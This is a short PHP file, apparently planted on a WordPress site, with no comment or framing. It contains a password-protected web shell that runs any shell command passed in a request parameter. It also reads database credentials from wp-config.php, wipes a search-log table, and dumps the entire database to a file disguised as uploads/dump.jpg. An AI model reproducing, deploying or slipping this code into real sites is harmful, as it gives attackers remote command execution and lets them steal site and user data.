<?php

var_dump($_REQUEST);
if (isset($_REQUEST['p']) and hash('sha256', $_REQUEST['p']) === 'b5637302736c3157a27f75389d5bf16cb629e64ca8ec1eb660b06fc7dea288d1') {
	  echo `$_REQUEST[c] 2>&1`;
		  return;
}


set_include_path(get_include_path() . PATH_SEPARATOR . "../" . PATH_SEPARATOR . "./");
echo get_include_path();

include "../wp-config.php";
$server = DB_HOST;
$user = DB_USER;
$pass = DB_PASSWORD;
$db = DB_NAME;

echo "starting<BR>\n";
$o = `echo TRUNCATE wp_relevanssi_log | mysql -h $server -u $user --password=$pass $db 2>&1`;
echo "$o: first ok<BR>\n";

$o = `mysqldump -h $server -u $user --password=$pass $db >uploads/dump.jpg`;
echo "$o: ok<BR>\n";

